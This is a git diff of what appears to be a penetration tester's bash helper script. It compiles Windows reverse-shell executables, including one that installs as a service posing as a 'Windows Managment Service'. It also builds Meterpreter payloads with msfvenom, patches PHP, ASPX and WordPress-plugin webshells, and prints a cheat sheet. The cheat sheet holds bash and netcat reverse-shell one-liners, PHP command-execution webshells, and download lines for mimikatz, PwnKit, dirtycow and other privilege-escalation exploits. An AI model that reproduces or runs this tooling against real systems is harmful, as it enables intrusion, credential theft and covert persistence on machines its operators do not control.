@@ -1,8 +1,14 @@
 #!/bin/bash
 
-# global variables
 lhost="127.0.0.1"
 lport=4444
+
+G="\e[32m"
+R="\e[31m"
+BB="\e[1;34m"
+M="\e[35m"
+LG="\e[38;5;245m"
+W="\e[0m"
 
 usage() {
     echo "Usage:"
@@ -33,46 +39,46 @@ get_ip_address() {
 }
 
 compile_payloads() {
-    echo "COMPILING"
-    echo "=============================================="
-    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/src/cppdll_shell.cpp
-    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/src/winshell.c
+    echo -e "\n${M}COMPILING${W}"
+    echo -e "${LG}==============================================${W}"
+    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/win/src/cppdll_shell.cpp
+    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/win/src/winshell.c
 
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/src/cppdll_shell.cpp --shared -o /home/$USER/auto/payloads/cppdll_shell.dll -lws2_32
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/src/winshell.c -o /home/$USER/auto/payloads/winshell.exe -lws2_32
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/cppdll_shell.cpp --shared -o /home/$USER/auto/payloads/win/cppdll_shell.dll -lws2_32
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/winshell.c -o /home/$USER/auto/payloads/win/winshell.exe -lws2_32
 
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/src/rs_service/main.c /home/$USER/auto/payloads/src/rs_service/service.c /home/$USER/auto/payloads/src/rs_service/shell.c -o /home/$USER/auto/payloads/rs_service.exe \
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/rs_service/main.c /home/$USER/auto/payloads/win/src/rs_service/service.c /home/$USER/auto/payloads/win/src/rs_service/shell.c -o /home/$USER/auto/payloads/win/rs_service.exe \
     -DSERVER_HOST=L"\"$lhost\"" -DSERVER_PORT=L"\"$lport\"" -DSERVICE_NAME=L"\"WinMansvc\"" -DSERVICE_DESC=L"\"Windows Managment Service\"" -DDISPLAY_NAME=L"\"WinMansvc\"" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
 }
 
 compile_meterpreter() {
-    echo "Making Meterpreter Payloads"
-    echo "=============================================="
-    msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/mettcp.exe
-    msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/methttps.exe
+    echo -e "\n${M}Making Meterpreter Payloads${W}"
+    echo -e "${LG}==============================================${W}"
+    msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/win/mettcp.exe
+    msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/win/methttps.exe
 }
 
 
 set_webshells() {
-    echo "Changing LHOST and LPORT in WebShells"
-    echo "=============================================="
-    sed -i "s/^\$ip =.*/\$ip = \"$lhost\";/; s/^\$port =.*/\$port = $lport;/" /home/$USER/auto/payloads/phpshell.php
-    zip /home/$USER/auto/payloads/wpshell.zip /home/$USER/auto/payloads/phpshell.php
-    echo ""
-    echo "pentestmonkey reverse shell location -> /home/$USER/auto/payloads/phpshell.php"
-    echo "wordpress plugin zip location -> /home/$USER/auto/payloads/wpshell.zip"
+    echo -e "\n${M}Changing LHOST and LPORT in WebShells${W}"
+    echo -e "${LG}==============================================${W}"
+    sed -i "s/^\$ip =.*/\$ip = \"$lhost\";/; s/^\$port =.*/\$port = $lport;/" /home/$USER/auto/payloads/web/phpshell.php
+    sed -i "s/^\$ip =.*/\$ip = \"$lhost\";/; s/^\$port =.*/\$port = $lport;/" /home/$USER/auto/payloads/web/wpshell-pm.php
+    zip /home/$USER/auto/payloads/web/wpshell-pm.zip /home/$USER/auto/payloads/web/wpshell-pm.php
 
-    sed -i "s/^String host =.*/String host = \"$lhost\";/; s/^int port =.*/int port = $lport;/" /home/$USER/auto/payloads/shell.aspx # not working rn for some reason
-    echo "aspx shell location -> /home/$USER/auto/payloads/shell.aspx"
+    echo "pentestmonkey reverse shell location -> /home/$USER/auto/payloads/web/phpshell.php"
+    echo "pentestmonkey wordpress-plugin zip location -> /home/$USER/auto/payloads/web/wpshell-pm.zip"
+    echo "basic ?cmd=[command] wordpress-plugin zip location -> /home/$USER/auto/payloads/web/wpshell-basic.zip"
+
+    sed -i "s/^String host =.*/String host = \"$lhost\";/; s/^int port =.*/int port = $lport;/" /home/$USER/auto/payloads/web/shell.aspx # not working rn for some reason
+    echo "aspx shell location -> /home/$USER/auto/payloads/web/shell.aspx"
 }
 
 
 # prints the list
 list_stuff() {
-    echo ""
-    echo ""
-    echo "WEBAPP"
-    echo "=============================================="
+    echo -e "\n\n${BB}WEBAPP${W}"
+    echo -e "${LG}==============================================${W}"
     echo "<?php echo system(\$_GET['cmd'])?>"
     echo "<?php%20echo%20system(\$_GET['cmd'])?>"
     echo "exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'\");"
@@ -85,8 +91,8 @@ list_stuff() {
         echo ""
     fi
     echo ""
-    echo "ONE LINERS"
-    echo "=============================================="
+    echo -e "${BB}ONE LINERS${W}"
+    echo -e "${LG}==============================================${W}"
     echo "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
     echo ""
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
@@ -106,68 +112,74 @@ list_stuff() {
         echo ""
     fi
     echo ""
-    echo "ACTIVE DIRECTORY"
-    echo "=============================================="
-    echo "iwr -uri http://$lhost/enum/PowerView.ps1 -OutFile PowerView.ps1"
+    echo -e "${BB}ACTIVE DIRECTORY${W}"
+    echo -e "${LG}==============================================${W}"
+    echo -e "iwr -uri http://$lhost/enum/win/PowerView.ps1 -OutFile ${G}PowerView.ps1${W}"
     echo ""
-    echo "iwr -uri http://$lhost/enum/SharpHound.exe -OutFile SharpHound.exe"
-    echo "iwr -uri http://$lhost/enum/SharpHound.ps1 -OutFile SharpHound.ps1"
+    echo -e "iwr -uri http://$lhost/enum/win/SharpHound.exe -OutFile ${G}SharpHound.exe${W}"
+    echo -e "iwr -uri http://$lhost/enum/win/SharpHound.ps1 -OutFile ${G}SharpHound.ps1${W}"
     echo ""
-    echo "iwr -uri http://$lhost/enum/PSTools/PsLoggedon.exe -OutFile PsLoggedon.exe"
-    echo "iwr -uri http://$lhost/enum/PSTools/PsExec.exe -OutFile PsExec.exe"
+    echo -e "iwr -uri http://$lhost/enum/win/PSTools/PsLoggedon.exe -OutFile ${G}PsLoggedon.exe${W}"
+    echo -e "iwr -uri http://$lhost/enum/win/PSTools/PsExec.exe -OutFile ${G}PsExec.exe${W}"
     echo ""
-    echo "iwr -uri http://$lhost/payloads/Rubeus.exe -OutFile Rubeus.exe"
-    echo "iwr -uri http://$lhost/payloads/mimikatz/mimikatz.exe -OutFile mimikatz.exe"
-    echo ""
-    echo ""
-    echo "WINDOWS PRIV ESCALATION"
-    echo "=============================================="
-    echo "iwr -uri http://$lhost/enum/winPEASx64.exe -OutFile winpeas.exe"
-    echo "iwr -uri http://$lhost/enum/PowerUp.ps1 -OutFile PowerUp.ps1"
-    echo ""
-    echo "iwr -uri http://$lhost/payloads/nc.exe -OutFile nc.exe"
-    echo "iwr -uri http://$lhost/payloads/powercat.ps1 -OutFile powercat.ps1"
-    echo "iwr -uri http://$lhost/payloads/useradd.exe -OutFile useradd.exe"
-    echo "iwr -uri http://$lhost/payloads/winshell.exe -OutFile winshell.exe"
-    echo ""
-    echo "iwr -uri http://$lhost/payloads/rs_service.exe -OutFile rs_service.exe"
-    echo ""
-    echo "iwr -uri http://$lhost/payloads/mettcp.exe -OutFile mettcp.exe"
-    echo "iwr -uri http://$lhost/payloads/methttps.exe -OutFile methttps.exe"
-    echo ""
-    echo "iwr -uri http://$lhost/payloads/cppdll_useradd.dll -OutFile cppdll_useradd.dll"
-    echo "iwr -uri http://$lhost/payloads/cppdll_shell.dll -OutFile cppdll_shell.dll"
-    echo ""
-    echo "iwr -uri http://$lhost/exploits/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe"
+    echo -e "iwr -uri http://$lhost/payloads/win/Rubeus.exe -OutFile ${G}Rubeus.exe${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/mimikatz.exe -OutFile ${G}mimikatz.exe${W}"
     echo ""
     echo ""
-    echo "LINUX PRIV ESCALATION"
-    echo "=============================================="
+    echo -e "${BB}WINDOWS PRIV ESCALATION${W}"
+    echo -e "${LG}==============================================${W}"
+    echo -e "${R}>${W} if you only have a cmd.exe shell then use below instead (mettcp.exe example)"
+    echo -e "${R}>${W} powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.8.91.46/payloads/mettcp.exe','mettcp.exe')"
+    echo ""
+    echo -e "iwr -uri http://$lhost/enum/win/winPEASx64.exe -OutFile ${G}winpeas.exe${W}"
+    echo -e "iwr -uri http://$lhost/enum/win/PowerUp.ps1 -OutFile ${G}PowerUp.ps1${W}"
+    echo ""
+    echo -e "iwr -uri http://$lhost/payloads/win/nc.exe -OutFile ${G}nc.exe${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/powercat.ps1 -OutFile ${G}powercat.ps1${W}"
+    echo ""
+    echo -e "iwr -uri http://$lhost/payloads/win/useradd.exe -OutFile ${G}useradd.exe${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/winshell.exe -OutFile ${G}winshell.exe${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/cppdll_useradd.dll -OutFile ${G}cppdll_useradd.dll${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/cppdll_shell.dll -OutFile ${G}cppdll_shell.dll${W}"
+    echo ""
+    echo -e "iwr -uri http://$lhost/payloads/win/mettcp.exe -OutFile ${G}mettcp.exe${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/methttps.exe -OutFile ${G}methttps.exe${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/rs_service.exe -OutFile ${G}rs_service.exe${W}"
+    echo ""
+    echo -e "iwr -uri http://$lhost/exploits/win/PrintSpoofer64.exe -OutFile ${G}PrintSpoofer64.exe${W}"
+    echo ""
+    echo ""
+    echo -e "${BB}LINUX PRIV ESCALATION${W}"
+    echo -e "${LG}==============================================${W}"
     echo "python3 -c \"import pty;pty.spawn('/bin/bash');\""
     echo ""
-    echo "wget http://$lhost/enum/linpeas.sh"
-    echo "wget http://$lhost/enum/LinEnum.sh"
-    echo "wget http://$lhost/enum/unix-privesc-check"
-    echo "wget http://$lhost/enum/traitor"
+    echo -e "wget http://$lhost/enum/lin/${G}linpeas.sh${W}"
+    echo -e "wget http://$lhost/enum/lin/${G}LinEnum.sh${W}"
+    echo -e "wget http://$lhost/enum/lin/${G}unix-privesc-check${W}"
+    echo -e "wget http://$lhost/enum/lin/${G}traitor${W}"
+    echo -e "wget http://$lhost/enum/lin/${G}pspy64${W}"
     echo ""
-    echo "wget http://$lhost/exploits/cve-2021-4034-poc.c"
-    echo "wget http://$lhost/exploits/PwnKit"
+    echo -e "wget http://$lhost/payloads/lin/${G}ncat${W}"
     echo ""
-    echo "wget -r -nH http://$lhost/exploits/exploit_nss/"
+    echo -e "wget http://$lhost/exploits/lin/${G}cve-2021-4034-poc.c${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}PwnKit${W}"
     echo ""
-    echo "wget http://$lhost/exploits/dirtycow.c"
-    echo "wget http://$lhost/exploits/polkit3560.sh"
-    echo "wget http://$lhost/exploits/ebpf_verifier.c"
-    echo "wget http://$lhost/exploits/ptrace.c"
+    echo -e "wget -r -nH http://$lhost/exploits/lin/${G}exploit_nss${W}/"
+    echo ""
+    echo -e "wget http://$lhost/exploits/lin/${G}dirtycow.c${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}polkit3560.sh${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}ebpf_verifier.c${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}ptrace.c${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}chocobo_root.c${W}"
     echo ""
     echo ""
-    echo "PIVOTING"
-    echo "=============================================="
-    echo "iwr -uri http://$lhost/payloads/nmap.exe -OutFile nmap.exe"
-    echo "wget http://$lhost/payloads/nmap"
+    echo -e "${BB}PIVOTING${W}"
+    echo -e "${LG}==============================================${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/nmap.exe -OutFile ${G}nmap.exe${W}"
+    echo -e "wget http://$lhost/payloads/lin/${G}nmap${W}"
     echo ""
-    echo "iwr -uri http://$lhost/payloads/plink.exe -OutFile plink.exe"
-    echo "wget http://$lhost/payloads/chisel"
+    echo -e "iwr -uri http://$lhost/payloads/win/plink.exe -OutFile ${G}plink.exe${W}"
+    echo -e "wget http://$lhost/payloads/lin/${G}chisel${W}"
     echo ""
 }
 
@@ -244,6 +256,8 @@ fi
 
 if $compile_and_dontlist; then
     compile_payloads
+    compile_meterpreter
+    set_webshells
 else
     list_stuff $genshells
 
